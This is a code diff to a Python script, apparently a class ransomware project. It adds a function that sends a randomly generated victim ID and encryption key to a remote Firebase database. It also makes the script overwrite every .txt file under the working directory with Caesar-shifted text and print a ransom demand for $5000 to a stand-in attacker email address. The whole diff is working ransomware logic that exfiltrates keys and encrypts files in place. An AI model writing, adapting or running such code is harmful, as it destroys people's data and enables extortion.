@@ -21,6 +21,10 @@
 
 import sys
 import os
+import random
+import firebase_admin
+from firebase_admin import credentials
+from firebase_admin import db
 
 
 #Function to check number with its corresponding unicode
@@ -29,9 +33,8 @@ def printchr():
         print(x, ":", chr(x))
 
 #Function to encrypt data within text file
-def encrypt(text):
+def encrypt(text, key):
     #How many shifts in the alphabet
-    key = 5
     encryptData = ""
 
     #Open file and read the data in the file char by char
@@ -68,7 +71,6 @@ def encrypt(text):
     print(encryptData)
 
     print("--------------------------")
-
     encryptFile = open(text, "w")
     encryptFile.write(encryptData)
     encryptFile.close()
@@ -80,17 +82,39 @@ def testEncrypt(path):
     encrypt(path)
 '''
 
+def sendKeyToDB():
+    cred = credentials.Certificate('cs377-project-creds.json')
+    firebase_admin.initialize_app(cred, {
+        'databaseURL': 'https://cs377-project-fall-20.firebaseio.com/'
+    })
 
-def main(path):
+    victim_id = random.randint(100, 1000)
+    key = random.randint(5, 15)
+
+    ref = db.reference('cs377-project')
+    victims_ref = ref.child('victims')
+    victims_ref.push().set({
+        'victim_id': victim_id,
+        'key': key
+    })
+
+    return victim_id, key
+
+
+def main(path, key):
     file = os.listdir(path)
     if len(file) > 0:
         for item in file:
             if item.endswith('.txt'):
-                encrypt(path + "/" + item)
+                encrypt(path + "/" + item, key)
             elif os.path.isdir(path + "/" + item):
-                main(path + "/" + item)
+                main(path + "/" + item, key)
+
 
 
 if __name__ == "__main__":
-    main(os.getcwd())
+    vid, key = sendKeyToDB()
+    main(os.getcwd(), key)
     #testEncrypt(os.getcwd() + "/test.txt")
+    print("YOUR ID IS", vid)
+    print("PLEASE EMAIL HACKER@ATTACKER.COM WITH YOUR ID AND PAYPAL $5000 FOR KEY TO DECRYPT FILES\n\n")
